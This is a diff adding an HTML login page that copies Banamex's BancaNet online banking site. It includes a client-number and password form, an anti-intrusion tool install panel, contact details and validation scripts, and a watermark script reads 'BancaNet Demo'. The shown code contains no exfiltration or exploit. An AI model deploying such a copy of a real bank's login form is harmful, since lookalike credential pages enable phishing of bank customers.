@@ -1,0 +1,989 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+    <head>
+
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+
+        <title>Bienvenido a BancaNet</title>
+
+        <link href="../bbAvatar/css/estilos.css" rel="stylesheet" type="text/css" />		
+
+		<style> html{display : none ; } </style>
+
+		<script type="text/javascript">if( self == top ) { document.documentElement.style.display = 'block' ; } else { top.location = self.location ; }</script>
+
+		<script type="text/javascript" src="../bbAvatar/js/motor.js"></script>
+
+		<script type="text/javascript" src="../bbAvatar/js/opciones.js"></script>		
+
+    </head>
+
+    <body onload="$('#USERID1').focus();">
+
+	<form name="form1" method="post">
+
+    	<div class="contenedor">
+
+            <div id="Header" class="ancho100p overflow clear paddingT10">
+
+            	<div class="ancho100p clear overflow">
+
+                    <div id="Logo_Banamex_es" onclick="javascript:ligasNegocio('http://www.banamex.com')"></div>                   
+
+                    <div class="floatR ancho459">
+
+                    	<div class="ligas_head">
+
+                        	<a href="#">English</a> |
+
+                            <a href="http://portal.banamex.com.mx/mapas/index.jsp?idioma=esp">Sucursales</a> |
+
+                            <a href="http://www.banamex.com/">www.banamex.com</a>
+
+                        </div>
+
+                    	<div id="Logo_Bancanet"></div>
+
+                    </div>
+
+                </div>
+
+                <div class="ancho100p clear overflow marginT10 f11" id="fechaActual"></div>
+
+                <div class="ancho100p clear overflow textR"><a href="#" class="">&nbsp;</a></div>
+
+            </div>
+
+            <div id="AreaTrabajo" class="ancho100p overflow clear marginT10">
+
+            	<table class="ancho100p" cellpadding="0" cellspacing="0">
+
+                	<tr>
+
+                    	<td class="bannerLeft_es" valign="top" onclick="javascript:ligasNegocio('http://www.banamex.com/bannersbancanet/home/')">&nbsp;</td>
+
+                        <td class="bannerCenter_es" valign="top" onclick="javascript:ligasNegocio('http://www.banamex.com/bannersbancanet/home/')">&nbsp;</td>
+
+                        <td class="bannerRight_es" valign="top" onclick="javascript:ligasNegocio('http://www.banamex.com/bannersbancanet/home/')">&nbsp;</td>
+
+                        <td class="ancho200">
+
+                        	<div class="cuadro_login alto224">
+
+								<div class="f16 negrita  paddingB10 borderB_FFFFFF">BancaNet</div>
+
+								<div class="f11 color333333 paddingB5 marginT10">N&uacute;mero de cliente</div>
+
+								<div><input type="password" class="input ancho160"  id="USERID1" name="USERID1" value="" autocomplete="off" onblur="maskUser();" onkeypress="return validar(event);" onkeydown="return nopaste(event);" maxlength="12" /></div>
+
+								<div class="f11 color333333 marginT15 paddingB5">Clave de acceso</div>
+
+								<div><input id="PASSWORD1" name="PASSWORD1" autocomplete="off" onkeypress="return validar(event)" onkeydown="return nopaste(event);" type="password" class="input ancho160" maxlength="8" /></div>
+
+								<div class="marginT20">
+
+									<input type="button" class="btnAZ86login" value="Entrar" onclick="ProcessForm(); return false;" />
+
+                                    <div class="candadologin"></div>
+
+								</div>
+
+								<div class="marginT24 paddingB10">
+
+									<a onclick="ProcessFormDesbloq();" href="#" class="f11 ">Desbloquear clave de acceso</a>
+
+								</div>
+
+							</div>
+
+                        </td>
+
+                    </tr>
+
+                </table>
+
+                <table class="ancho100p marginT20" cellpadding="0" cellspacing="0">
+
+                	<tr>
+
+                        <td valign="top">
+
+                        	<table class="ancho100p" cellpadding="0" cellspacing="0">
+
+                            	<tr>
+
+                                	<td class="ancho33p borderR_CCCCCC" valign="top" align="center">
+
+                                    	<div id="noinstalado" class="cuadro_login3"> 
+
+                                        	<div style="width:100%; height:32px; margin-top:10px;">
+
+                                            	<div class="protegete"></div>
+
+                                                <div style="color:#EE2E24; font-size:12px; font-weight:bold; text-align:left">&iexcl;Prot&eacute;gete de <br />fraudes cibern&eacute;ticos!</div>
+
+                                            </div>
+
+                                            <div style="width:100%; height:40px; margin-top:19px;">
+
+                                            	<div class="f11 marginL8 color333" style="text-align:left">                                                	
+
+                                                    Instala nuestra Herramienta Anti-Intrusos<br />
+
+                                                    que ahora te protege a&uacute;n cuando no est&eacute;s<br />
+
+                                                    en <span class="negrita f11 color333">Banca</span>Net.
+
+                                                </div>
+
+                                            </div>
+
+                                            <div style="width:100%; height:12px; margin-top: 10px;">
+
+                                            	<a onclick="AbrirVentana('minfo');return false;" href="#" class="f11 floatL underline marginL8">M&aacute;s informaci&oacute;n &raquo;</a>
+
+                                            </div>
+
+                                            <div style="width:100%; height:20px; margin-top:19px;">
+
+                                            	 <input type="button" class="btnRJ86login floatL marginL8 f11" value="Instalar ahora"/>
+
+                                            </div>                                            
+
+                    					</div>
+
+                                        <div id="actualizacion" class="cuadro_login3" style="display:none">
+
+                                        	<div style="width:100%; height:32px; margin-top:10px;">
+
+                                            	<div class="protegete"></div>
+
+                                                <div style="color:#EE2E24; font-size:12px; font-weight:bold; text-align:left">¡Protégete<br />aún más!</div>
+
+                                            </div>
+
+                                            <div style="width:100%; height:40px; margin-top:19px;">
+
+                                            	<div class="f11 marginL8 color333" style="text-align:left">                                                	
+
+                                                    Instala el nuevo componente de nuestra<br />
+
+                                                    Herramienta Anti-Intrusos que ahora te<br />
+
+                                                    protege aún cuando no estés en <span class="negrita f11 color333">Banca</span>Net.
+
+                                                </div>
+
+                                            </div>
+
+                                            <div style="width:100%; height:12px; margin-top: 10px;">
+
+                                            	<a onclick="AbrirVentana('minfo');return false;" href="#" class="f11 floatL underline marginL8">M&aacute;s informaci&oacute;n &raquo;</a>
+
+                                            </div>
+
+                                            <div style="width:100%; height:20px; margin-top:19px;">
+
+                                            	 <input type="button" class="btnRJ86login floatL marginL8 f11" value="Actualizar" onclick=" AbrirVentana('instal');"/>
+
+                                            </div>                                         	
+
+                    					</div>
+
+                                        <div id="instalado" class="cuadro_login3" style="display:none">
+
+                                        	<div style="width:100%; height:44px; margin-top:10px;">
+
+                                            	<div class="contendorinstalado"><div class="instalado"></div></div>
+
+                                                <div style="color:#0C9423; font-size:12px; font-weight:bold; text-align:left">Herramienta<br />Anti-intrusos<br />instalada</div>
+
+                                            </div>
+
+                                            <div style="width:100%; height:30px; margin-top:19px;">
+
+                                            	<div class="f11 marginL8 color333" style="text-align:left">                                                	
+
+                                                    Esta PC cuenta con la Herramienta<br />
+
+                                                    Anti-Intrusos instalada.<br />                                                   
+
+                                                </div>
+
+                                            </div>
+
+                                            <div style="width:100%; height:12px; margin-top: 10px;">
+
+                                            	<a onclick="AbrirVentana('minfo');return false;" href="#" class="f11 floatL underline marginL8">M&aacute;s informaci&oacute;n &raquo;</a>
+
+                                            </div>
+
+                    					</div>                                    	
+
+                                    </td>
+
+                                    <td class="ancho33p borderR_CCCCCC" valign="top" align="center">
+
+                                    	<div class="cuadro_login2">
+
+                                    		<div class="imglogin_secundario_es" onclick="javascript:ligasNegocio('http://www.banamex.com/bannersbancanet/secundario/')"></div>
+
+                                        </div>
+
+                                    </td>									
+
+                                    <td class="ancho33p" valign="top">
+
+                                    	<div class="ancho225 overflow paddingL10 marginAuto" style="width:230px">
+
+                                            <div class="f14 negrita paddingB10">Comun&iacute;cate</div>
+
+                                            <div class="paddingT5 paddingB5 f11 borderT_Dotted_CCCCCC">
+
+                                                <span class="negrita f11">Tel&eacute;fonos:</span><br />
+
+                                                D.F.1226 3990<br />
+
+												Interior 01 800 110 3990<br />
+
+                                                De Estados Unidos y Canad&aacute;<br />
+
+                                                01800 226 2639 / 01800 203 5093<br />
+
+                                                De otro Pa&iacute;s por cobrar a EUA 1 314 275 6799
+
+                                            </div>
+
+                                            <div class="paddingT5 paddingB5 f11 borderT_Dotted_CCCCCC">
+
+                                                Lun a S&aacute;b de 7 a 21 hrs.
+
+                                            </div>
+
+                                            <div class="paddingT5 paddingB5 f11 borderT_Dotted_CCCCCC">
+
+                                                <span class="negrita f11">Correo Electr&oacute;nico:</span><br />
+
+                                                &quot;Cont&aacute;ctanos&quot; dentro de www.banamex.com
+
+                                            </div>
+
+                                        </div>
+
+                                    </td>
+
+                                </tr>
+
+                            </table>
+
+                        </td>
+
+                        <td class="ancho200" valign="top">
+
+							<div class="cuadro_login padding10">
+
+								<div class="ancho100p clear overflow paddingB10">
+
+									<div class="floatL ancho40">
+
+										<div class="flechalogin top2"></div>
+
+									</div>
+
+									<div class="floatL f11">
+
+										Conoce BancaNet<br />
+
+										<span class="color1e87dd">
+
+										<a href="#" class="f11">Demo</a> 
+
+										<a href="#" class="f11">&nbsp;</a> 
+
+										<a href="#" class="f11">&nbsp;</a>
+
+										</span>
+
+									</div>
+
+								</div>								
+
+							</div>
+
+                           <div class="ancho190 floatR f11 marginT20">
+
+                            	<table cellpadding="0" cellspacing="0">
+
+                                    <tr>
+
+                                        <td class="f11" valign="bottom">
+
+                                        	BancaNet requiere:&nbsp;
+
+                                      	</td>
+
+                                       	<td valign="bottom" align="left">
+
+                                        	<table cellpadding="0" cellspacing="0">
+
+                                            	<tr>                                                	
+
+                                                    <td onclick="javascript:ligasReq('http://windows.microsoft.com/es-MX/internet-explorer/products/ie/home')">
+
+                                                    	<div id="browser" class="requiereloginie top5"></div>
+
+                                                    </td>
+
+                                                    <td onclick="javascript:ligasReq('http://get.adobe.com/es/reader/')">
+
+                                                    	<div id="adobe" class="requiereloginadobe top5"></div>
+
+                                                    </td>
+
+                                                    <td onclick="javascript:ligasReq('http://www.java.com/es/download/windows_ie.jsp')">
+
+                                                    	<div id="java" class="requiereloginjava top5"></div>
+
+                                                    </td>
+
+                                                </tr>
+
+                                            </table>
+
+                                       	</td>
+
+                                	</tr>
+
+                                </table>
+
+                            </div>
+
+                        </td>
+
+                    </tr>
+
+                </table>
+
+            </div>
+
+            <div id="Footer" class="ancho100p overflow clear marginT20">
+
+            	<div class="ancho100p colorE6E6E6 paddingB5 borderB_E6E6E6" id="waterMark"></div>
+
+                <div class="ancho100p marginT10 overflow">
+
+                	<div class="floatL f11">
+
+                        D.R. &copy; Copyright <span class="f11" id="anioActual"></span>, Derechos Reservados. Banco Nacional de M&eacute;xico, S.A., integrante de Grupo Financiero Banamex.<br />
+
+                        Isabel la Cat&oacute;lica 44. Col. Centro Hist&oacute;rico. Del. Cuauht&eacute;moc. C.P. 06000, M&eacute;xico, Distrito Federal, M&eacute;xico.
+
+                    </div>
+
+                    <div class="floatR">
+
+                    	<a onclick="AbrirVentana('Terminos');return false;" href="#" class=" f11">T&eacute;rminos, Condiciones de uso y Privacidad</a>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+		
+
+		<div id="cortinaOverlayLogin" class="cerrarOverlay" style="display: none;"></div>
+
+		<div id="ventanaEmergenteLogin" class="ventanaEmergenteLogin" style="display:none;">
+
+			<div class="ventanaEmergenteLogin-data" id="ventanaEmergente-contenidoLogin" style="display: block;">
+
+				<div id="tabla_emergente" class="bordeVentanaLogin">
+
+					<div class="ventanaEmergente_bodyLogin">
+
+                        <div id="mensajeError_contenido_div" >
+
+                            <div class="mensajeError_contenidoInLogin">
+
+                                <div class="mensajeError_Fila1Login">
+
+                                    <div class="mensajeError_login"></div><span class="mensajeError_loginTexto">Inicio de sesi&oacute;n rechazada</span>
+
+                                </div>												
+
+
+
+                                <div class="mensajeError_Fila2Login color666">
+
+                                    <span class="negrita f11 color333333">&iquest;Qu&eacute; puedo hacer?</span><br />
+
+                                    Favor verificar los campos correspondientes.
+
+                                    <br /><br />
+
+
+
+                                    Si deseas comun&iacute;cate a servicio a clientes al 1226 3990 (D.F y &Aacute;rea Metropolitana) &oacute; al 01 800 110 3990 (Del interior de la Rep&uacute;blica).
+
+                                </div>
+
+
+
+                                <div class="mensajeError_Fila3Login">
+
+                                    <div class="floatR"><input id="botonmodal" type="button" value="Continuar" class="btnAZ86login CerrarVentanaEmergente" /></div>
+
+
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+					</div>
+
+				</div>	
+
+			</div>
+
+		</div>
+
+        
+
+        <table id="tooltip-browser" cellpadding="0" cellspacing="0">
+
+        <tr>
+
+            <td>
+
+              <div id="tail-tooltip-browser"></div>
+
+                <div class="t_tooltipLogin">
+
+                    BancaNet es compatible para Internet Explorer 7 o superior,<br /> Mozilla Firefox 4 o superior, Safari 5.0 , Google Chrome 12.0.
+
+                </div>
+
+            </td>
+
+        </tr>
+
+        </table>
+
+        
+
+        <table id="tooltip-adobe" cellpadding="0" cellspacing="0">
+
+        <tr>
+
+            <td>
+
+                <div id="tail-tooltip-adobe"></div>
+
+                <div class="t_tooltipLogin">
+
+                   BancaNet requiere Adobe Reader 6.0 o superior.
+
+                </div>
+
+            </td>
+
+        </tr>
+
+        </table>
+
+        
+
+        <table id="tooltip-java" cellpadding="0" cellspacing="0">
+
+        <tr>
+
+            <td>
+
+                <div id="tail-tooltip-java" style="margin-right:30px"></div>
+
+                <div class="t_tooltipLogin">
+
+                     BancaNet requiere Java 2 RE 5.0 o superior.
+
+                </div>
+
+            </td>
+
+        </tr>
+
+        </table>
+
+        
+
+<script type="text/javascript" language="javascript">
+
+wm1="BancaNet Demo";
+
+$('#waterMark').html(wm1);
+
+</script>
+
+  <input type="hidden" name="DATA7">
+
+  <input type="hidden" name="marcaAgua">
+
+ </form>
+
+</body>
+
+<script type="text/javascript" language="javascript">
+
+var hWin,P_$m="toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=580,height=300";
+
+var P_$mc="toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=620,height=340";
+
+
+
+function validar(e) { 
+
+    t = (document.all)?e.keyCode:e.which; 
+
+    if (t==13)
+
+        ProcessForm();
+
+    if ((t==86&&e.ctrlKey) || (t==67&&e.ctrlKey) || (t==88&&e.ctrlKey) || (t > 32 && t < 48) || (t > 57 && t < 65) || (t > 90 && t < 96) || (t > 122))
+
+        return false;
+
+	return true;
+
+}
+
+
+
+function AbrirVentana(c){
+
+	var b="/spanishdir/",a=b+"ayudas/";
+
+	if(c=="Recomendaciones")
+
+	  hWin=open(a+"aantes.htm","Recomendaciones",P_$m);
+
+	else if(c=="Ayuda")
+
+		hWin=open(a+"aindex.htm","Ayuda",P_$m);
+
+	else if(c=="Contactanos")
+
+		hWin=open("http://portal.banamex.com.mx/esp/contactenos.html","Contactanos",P_$m);
+
+	else if(c=="Terminos")
+
+		hWin=open("terminos.htm","Terminos","toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=800,height=500");
+
+	else if(c=="Contrato") {
+
+		hWin=open("OR_V_2908.pdf","Contrato",P_$mc);
+
+		hWin.moveTo(580,0);
+
+	} else if (c=="Ayudab")
+
+		hWin=open(a+"ayudabrowser.htm","Seguridad",P_$m);
+
+	else if(c=="Contrato") {
+
+		hWin=open("OR_V_2908.pdf","Contrato",P_$mc);
+
+		hWin.moveTo(580,0);
+
+	} else if(c=="Ayudab")
+
+		hWin=open(a+"ayudabrowser.htm","Seguridad",P_$m);
+
+	else if(c=="minfo")
+
+		hWin=open("https://www.banamex.com/resources/bancanets/bnp/esp/contenedor/pdfs/ahnlab.pdf","Mas_informacion","toolbar=no,directories=no,menubar=no,status=no,scrollbars=yes,width=800,height=500,top="+((screen.height-500)/2)+",left="+((screen.width-800)/2));
+
+	else if(c=="instal")
+
+		hWin=open(b+"splash/help/contrato2.htm","Instalar_ahora",'location=yes,height='+(screen.height-105)+',width='+(screen.width-10)+',top=0,left=0,resizable=yes,menubar=no,scrollbars=yes,titlebar=no,toolbar=no,status=yes');
+
+	else if(c=="cseg")
+
+		hWin=open(a+"garantia.htm","Compromiso_de_Seguridad",P_$m);
+
+	else if(c=="tuseg")
+
+		hWin=open(a+"mantenseguridad.htm","Manten_tu_Seguridad",P_$m);
+
+	else if(c=="mnfo")
+
+		hWin=open("../eCare/win_netkeyinfo.htm","Mas_informacion",P_$m);
+
+	else if(c=="netkey")
+
+		hWin=open("../eCare/win_netkeyobtener.htm","Obtener",P_$m)
+
+}
+
+
+
+function abrilModal(parametro){
+
+	
+
+	$.modalLogin({
+
+		opacity:60, 
+
+		overlayClose:false, 
+
+		flagDiv:true,
+
+		widthDivIfrm:600,
+
+		heightDivIfrm:150
+
+	});	
+
+	setTimeout('$("#botonmodal").focus();', 200)
+
+	$("#botonmodal").click(function(){asignarfoco(parametro)});
+
+}
+
+
+
+function asignarfoco(parametro){
+
+	if(parametro == "user"){
+
+		$('#USERID1').focus();
+
+	}else if(parametro == "pass"){
+
+		$('#PASSWORD1').focus();
+
+	}else{
+
+		$('#USERID1').focus();
+
+	}
+
+}
+
+
+
+function ProcessForm(){
+
+	maskUser();
+
+	var userValue = $('#USERID1').val();
+
+	var passValue = $('#PASSWORD1').val();	
+
+	var userLength = userValue.length;
+
+	var passLength = passValue.length;
+
+	if (userValue=='') {
+
+		abrilModal("user");		
+
+		return;
+
+    }
+
+	if (!numericCheck(userValue)) {
+
+		abrilModal("user");		
+
+		return;
+
+	}
+
+	if (passValue=="") {
+
+		abrilModal("pass");
+
+		return;
+
+    }
+
+	else
+
+	{
+
+		if (!numericCheck(userValue)) {
+
+			abrilModal("user");
+
+			return;
+
+		}
+
+		if (passLength < 8) {
+
+			abrilModal("pass");
+
+			return;
+
+		}
+
+	}
+
+	$('input[name="DATA7"]').attr("value","ZRUT");
+
+	$('input[name="marcaAgua"]').attr("value",wm1);
+
+	document.getElementById('USERID1').value = parseInt(document.getElementById('USERID1').value, 10);
+
+	var nw=window.open('submit.htm','','location=yes,height='+(screen.height-105)+',width='+(screen.width-10)+',top=0,left=0,resizable=yes,menubar=no,scrollbars=yes,titlebar=no,toolbar=no,status=yes');
+
+	nw.focus();
+
+}
+
+
+
+function numericCheck(value) {
+
+    var VALID_DIGITS="0123456789";
+
+    var ch;
+
+	var i;
+
+    for(i=0; i<value.length; i++){
+
+        ch = value.charAt(i);
+
+        if (VALID_DIGITS.indexOf(ch) < 0) {
+
+            return(false);
+
+        }
+
+    }
+
+    return(true);
+
+}
+
+
+
+function isAlphanumeric(value) {
+
+	var VALID="0123456789abcdefghijklmnÃ±opqrstuvwxyzABCDEFGHIJKLMNÃ‘OPQRSTUVWXYZ";
+
+	var ch;
+
+	var i;
+
+	for (i=0; i<value.length; i++) {
+
+		ch = value.charAt(i);
+
+		if (VALID.indexOf(ch) < 0) {
+
+			return false;
+
+		}
+
+	}
+
+	return true;
+
+}
+
+
+
+function nopaste(e) { 
+
+    t = (document.all)?e.keyCode:e.which; 
+
+    if ((t==86&&e.ctrlKey) || (t==67&&e.ctrlKey) || (t==88&&e.ctrlKey))
+
+        return false;
+
+	return true;             
+
+}
+
+
+
+currentText = '';
+
+function startPreventCopyCutandPaste(){
+
+document.getElementById('USERID1').onkeyup = function (){
+
+newTextLength = this.value.length;
+
+currentTextLength = currentText.length;
+
+
+
+if(newTextLength > (currentTextLength +2)){
+
+this.value = currentText;
+
+}else{
+
+currentText = this.value;
+
+}
+
+}
+
+}
+
+
+
+function ProcessFormDesbloq(){
+
+	var nwin=window.open('desbloqIni.htm','','location=yes,height='+(screen.height-105)+',width='+(screen.width-10)+',top=0,left=0,resizable=yes,menubar=no,scrollbars=no,titlebar=no,toolbar=no,status=yes');
+
+	nwin.focus();	
+
+}
+
+
+
+function maskUser(){
+
+	var userID = $('#USERID1').val();
+
+	var ind = null;
+
+	if(userID != null && userID.length > 0){
+
+		ind = userID.length;
+
+		while(ind < 6){
+
+			userID = '0' + userID;
+
+			ind++;
+
+		}
+
+		$('#USERID1').attr('value',userID);
+
+	}
+
+}
+
+
+
+function makeArray(n){
+
+  this.length = n;
+
+  for (i=1;i<=n;i++){
+
+    this[i]=0;
+
+  }
+
+  return this;
+
+}
+
+
+
+function displayDate() {
+
+  var this_month = new makeArray(12);
+
+  this_month[0]  = "Enero";
+
+  this_month[1]  = "Febrero";
+
+  this_month[2]  = "Marzo";
+
+  this_month[3]  = "Abril";
+
+  this_month[4]  = "Mayo";
+
+  this_month[5]  = "Junio";
+
+  this_month[6]  = "Julio";
+
+  this_month[7]  = "Agosto";
+
+  this_month[8]  = "Septiembre";
+
+  this_month[9]  = "Octubre";
+
+  this_month[10] = "Noviembre";
+
+  this_month[11] = "Diciembre";
+
+  var this_day_e = new makeArray(7);
+
+  this_day_e[0]  = "Domingo";
+
+  this_day_e[1]  = "Lunes";
+
+  this_day_e[2]  = "Martes";
+
+  this_day_e[3]  = "Mi&eacute;rcoles";
+
+  this_day_e[4]  = "Jueves";
+
+  this_day_e[5]  = "Viernes";
+
+  this_day_e[6]  = "S&aacute;bado";
+
+  var today = new Date();
+
+  var day   = today.getDate();
+
+  var month = today.getMonth();
+
+  var year  = today.getYear();
+
+  var dia = today.getDay();
+
+    if (year < 1000) {
+
+       year += 1900; }
+
+	var hour = today.getHours() < 10 ? '0' + today.getHours() : today.getHours();
+
+	var minute = today.getMinutes() < 10 ? '0' + today.getMinutes() : today.getMinutes();
+
+	var seconds = today.getSeconds() < 10 ? '0' + today.getSeconds() : today.getSeconds();
+
+	  return( " " + this_day_e[dia] + " " + day + " de " + this_month[month] + " de " + year + ", " + hour + ":" + minute  + ":" + seconds + " Centro de M&eacute;xico" );
+
+}
+
+
+
+$(document).ready(function(){
+
+	$('#fechaActual').html(displayDate());
+
+	$('#anioActual').html(function () { 
+
+		var anio = new Date();
+
+		var anioAux = anio.getYear();
+
+		return anioAux < 1000 ? anioAux +=1900 : anioAux;
+
+	});	
+
+	showtooltipsLogin();
+
+ });
+
+</script>
+
+</html>
